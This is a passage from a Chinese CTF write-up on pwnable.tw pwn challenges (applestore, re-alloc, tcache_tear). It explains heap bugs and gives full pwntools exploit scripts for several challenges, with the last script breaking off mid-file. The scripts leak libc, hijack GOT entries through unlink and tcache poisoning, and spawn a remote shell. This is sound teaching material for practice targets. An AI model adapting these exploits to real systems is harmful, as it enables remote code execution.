<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">checkout</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> *v2[<span class="number">5</span>]; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = cart();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">7174</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;*: iPhone 8 - $1&quot;</span>);</span><br><span class="line">    asprintf(v2, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;iPhone 8&quot;</span>);</span><br><span class="line">    v2[<span class="number">1</span>] = (<span class="type">char</span> *)<span class="number">1</span>;</span><br><span class="line">    insert((<span class="type">int</span>)v2);</span><br><span class="line">    v1 = <span class="number">7175</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Total: $%d\n&quot;</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Want to checkout? Maybe next time!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到，当购物车中的商品总价格为7174元时可以在该函数中1元购买iPhone-8，实际上这个函数与add中不同的是add函数会malloc个堆块链入链表，而这个函数直接将栈中的v2数组链入链表了，因为v2位置的数据并不是一成不变的，因此我们可以用这个漏洞来攻击程序。</p>
<p>首先，我们需要满足<code>checkout()</code>函数的条件，使用z3求解即可</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line">a, b, c, d = Ints(<span class="string">&#x27;a b c d&#x27;</span>)</span><br><span class="line">solver = Solver()</span><br><span class="line">solver.add(<span class="number">199</span>*a + <span class="number">299</span>*b + <span class="number">399</span>*c + <span class="number">499</span>*d == <span class="number">7174</span>)</span><br><span class="line">solver.add(a&gt;=<span class="number">0</span>)</span><br><span class="line">solver.add(b&gt;=<span class="number">0</span>)</span><br><span class="line">solver.add(c&gt;=<span class="number">0</span>)</span><br><span class="line">solver.add(d&gt;=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    ans = solver.model()</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;no ans!&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>得到解（每个人得到的可能不一样）</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a : <span class="number">7</span>, b : <span class="number">18</span>, c : <span class="number">1</span>, d : <span class="number">0</span>]</span><br></pre></td></tr></table></figure></div>

<p>这时我们可以发现使用read函数在各个选项中读入数据的位置刚好处于链表链入的位置（偏移为2），因此我们可以通过修改chunk[0]的值来泄露栈地址和libc地址</p>
<p>然后我们需要getshell，因为got表可写，因此我们的首选位置是got表，我们使用delete函数中的双向链表的删除操作来修改atoi函数的got表，但是我们需要修改时chunk[2]和chunk[3]指向位置都可写，因此我们可以修改ebp到got处，因为函数中的局部变量一般都是ebp寻址，然后我们可以直接通过read来修改atoi函数got表为system函数地址。</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10104</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./applestore&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./applestore&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list</span>():</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">choice</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Device Number&gt; &#x27;</span>, <span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">choice</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Item Number&gt; &#x27;</span>, <span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cart</span>():</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Let me check your cart. ok? (y/n) &gt; &#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkout</span>():</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Let me check your cart. ok? (y/n) &gt; &#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[199: 7, 299: 18, 399: 1, 499: 0]      z3约束求解</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">                                        <span class="comment">#then total money == 7174</span></span><br><span class="line">checkout()                              <span class="comment">#buy iphone 8</span></span><br><span class="line"></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Let me check your cart. ok? (y/n) &gt; &#x27;</span>, <span class="string">b&#x27;y\x00&#x27;</span>+p32(<span class="number">0x804b028</span>)+p32(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;27: &#x27;</span>)</span><br><span class="line">puts = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libcbase = puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sys = libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">                                        <span class="comment">#then the index of stack is 1</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Let me check your cart. ok? (y/n) &gt; &#x27;</span>, <span class="string">b&#x27;y\x00&#x27;</span>+p32(<span class="number">0x804b070</span>)+p32(<span class="number">0</span>)*<span class="number">2</span>)       <span class="comment">#泄露栈地址</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;1: &#x27;</span>)</span><br><span class="line">stack = u32(io.recv(<span class="number">4</span>))+<span class="number">0x20</span></span><br><span class="line">log.success(<span class="string">&#x27;stack ===&gt; &#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Item Number&gt; &#x27;</span>, <span class="string">b&#x27;1\x00&#x27;</span>+p32(<span class="number">0</span>)*<span class="number">2</span>+p32(<span class="number">0x804b040</span>+<span class="number">0x18</span>)+p32(stack-<span class="number">8</span>))    <span class="comment">#劫持栈到got表段</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;/bin/sh\x00\x00\x00&#x27;</span>+p32(sys))</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x09-re-alloc"><a href="#0x09-re-alloc" class="headerlink" title="0x09. re-alloc"></a>0x09. re-alloc</h2><p><code>checksec</code>看到程序没开PIE和relro，因此可以修改got表，同时可以看到程序开启了FORTIFY保护，该保护可以缓解格式化字符串等漏洞。</p>
<p>IDA打开看程序，可以看到是一个菜单题，不过大致看下来发现程序只使用了realloc()函数，关于这个函数，引用赤道企鹅师傅博客中的总结</p>
<blockquote>
<h3 id="关于realloc"><a href="#关于realloc" class="headerlink" title="关于realloc"></a>关于realloc</h3><p>realloc原型是<code>extern void *realloc(void *mem_address, unsigned int newsize);</code></p>
<ol>
<li>第一个参数为空时，realloc等价于malloc(size)</li>
<li>第一个参数不为空时<ul>
<li>若mem_address被检测到不是堆上的地址，会直接报错</li>
<li>若mem_address为合法堆地址<ul>
<li>若第二个参数size&#x3D;0，则realloc相当于free(mem_address)</li>
<li>若第二个参数不为0，这时才是realloc本身的作用——内存空间的重分配<ul>
<li>如果realloc的size小于原有size则内存位置不会变动，函数返回原先的指针</li>
<li>如果realloc的size大于原有size，则会从高地址拓展堆块大小或直接从top chunk取出合适大小的堆块，然后用memcpy将原有内容复制到新堆块，同时free掉原堆块，最后返回新堆块的指针</li>
</ul>
</li>
</ul>
</li>
<li>注意，realloc修改size后再free和直接free进入的是不同大小的bin（这点很重要）</li>
</ul>
</li>
</ol>
</blockquote>
<p>然后来看程序中的函数，首先来看<code>allocate()</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">index = read_long();</span><br><span class="line"><span class="keyword">if</span> ( index &gt; <span class="number">1</span> || heap[index] )</span><br><span class="line">&#123;</span><br><span class="line">  LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = read_long();</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x78</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">realloc</span>(<span class="number">0LL</span>, size);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      heap[index] = v4;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">      v0 = (_BYTE *)(heap[index] + read_input(heap[index], size));</span><br><span class="line">      *v0 = <span class="number">0</span>;                                <span class="comment">// off by null</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;alloc error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Too large!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到程序只能分配0 1两个索引，最大不能超过0x78，还存在<code>off-by-null</code>漏洞</p>
<p>然后来看<code>reallocate()</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">v1 = read_long();</span><br><span class="line"><span class="keyword">if</span> ( v1 &gt; <span class="number">1</span> || !heap[v1] )</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">size = read_long();</span><br><span class="line"><span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Too large!&quot;</span>);</span><br><span class="line">v3 = <span class="built_in">realloc</span>((<span class="type">void</span> *)heap[v1], size);</span><br><span class="line"><span class="keyword">if</span> ( !v3 )</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;alloc error&quot;</span>);</span><br><span class="line">heap[v1] = v3;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> read_input(heap[v1], size);</span><br></pre></td></tr></table></figure></div>

<p>这里可以使realloc大小为0而产生UAF</p>
<p><code>rfree()</code>函数没什么特别的，就是常规的释放，置零</p>
<p>因此我们的主要思路就集中在UAF这个漏洞上了，可以利用UAF来分配到got表，修改<code>atoi()</code>函数的got表项为<code>printf()</code>的plt位置，形成格式化字符串漏洞，泄露libc。然后再修改为system函数地址就可以getshell了。（至于<code>off-by-null</code>，貌似没什么用，或许可以用scanf合并fastbin堆块，然后unlink）</p>
<p>exp：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10106</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./re-alloc&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./re-alloc&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">index, size, data</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Data:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc</span>(<span class="params">index, size, data</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Data:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#realloc造成UAF</span></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x30</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x30</span>, p64(<span class="number">0x404040</span>)+p64(<span class="number">0</span>))</span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x30</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x40</span>, p64(<span class="number">0x404040</span>)+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x60</span>, p64(<span class="number">0x404040</span>)+p64(<span class="number">0</span>))</span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x40</span>, p64(<span class="number">0x404040</span>)+p64(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#0x40和0x50大小的tcache均已被修改为got表</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x70</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x30</span>, p64(elf.plt[<span class="string">&#x27;printf&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#此时atoll的got已被修改为printf的plt</span></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Index:&#x27;</span>, <span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)-<span class="number">0x83e4a</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sys = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Index:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Size:&#x27;</span>, <span class="string">b&#x27;%64c&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Data:&#x27;</span>, p64(sys)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Index:&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x0a-tcache-tear"><a href="#0x0a-tcache-tear" class="headerlink" title="0x0a. tcache_tear"></a>0x0a. tcache_tear</h2><p>先<code>checksec</code>看到只没开PIE，存在UAF，限制8次</p>
<p>我的思路是爆破到<code>tcache_struct</code>结构体中然后修改对应大小的count，使再释放一次堆块就可以进入<code>unsorted bin</code>，然后用<code>tcache poison</code>打stdout泄露出libc，然后就是常规的<code>tcache poison</code>打<code>__free_hook</code>了（爆破打远程很慢，还可能卡死，得多跑几次）</p>
<p>爆出flag之后看了企鹅师傅的wp（<a class="link"   target="_blank" rel="noopener" href="https://eqqie.cn/index.php/archives/1414%EF%BC%89%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%BB%A5%E5%9C%A8bss%E6%AE%B5%E4%B8%8A%E6%9E%84%E9%80%A0%E5%A0%86%E5%9D%97%EF%BC%8C%E7%84%B6%E5%90%8E%E5%88%A9%E7%94%A8%E6%89%93%E5%8D%B0%E5%8A%9F%E8%83%BD%E7%9B%B4%E6%8E%A5%E6%89%93%E5%8D%B0%E5%87%BAlibc%E3%80%82%EF%BC%88%E8%BF%98%E6%98%AF%E6%80%9D%E8%B7%AF%E5%83%B5%E5%8C%96%E4%BA%86" >https://eqqie.cn/index.php/archives/1414），发现可以在bss段上构造堆块，然后利用打印功能直接打印出libc。（还是思路僵化了 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="打法1—爆破tcache-struct-爆破stdout"><a href="#打法1—爆破tcache-struct-爆破stdout" class="headerlink" title="打法1—爆破tcache_struct+爆破stdout"></a>打法1—爆破tcache_struct+爆破stdout</h3><p>这里是我的exp：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">data</span>):</span><br><span class="line">    